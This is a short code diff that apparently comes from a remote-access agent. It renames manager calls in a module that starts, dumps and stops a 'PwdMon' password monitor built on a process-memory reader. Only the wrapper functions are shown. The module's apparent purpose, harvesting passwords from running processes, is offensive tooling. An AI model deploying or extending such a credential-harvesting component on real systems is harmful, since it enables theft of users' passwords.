@@ -20,11 +20,11 @@ from memorpy import MemWorker, ProcessException
 
 
 def start(poll=20):
-    if pupy.manager.active(PwdMon):
+    if pupy.agent.manager.active(PwdMon):
         return False
 
     try:
-        pupy.manager.create(
+        pupy.agent.manager.create(
             PwdMon
         )
     except:
@@ -33,14 +33,14 @@ def start(poll=20):
     return True
 
 def dump():
-    mon = pupy.manager.get(PwdMon)
+    mon = pupy.agent.manager.get(PwdMon)
     if mon:
         return mon.results
 
 def stop():
-    mon = pupy.manager.get(PwdMon)
+    mon = pupy.agent.manager.get(PwdMon)
     if mon:
-        pupy.manager.stop(PwdMon)
+        pupy.agent.manager.stop(PwdMon)
         return mon.results
 
 
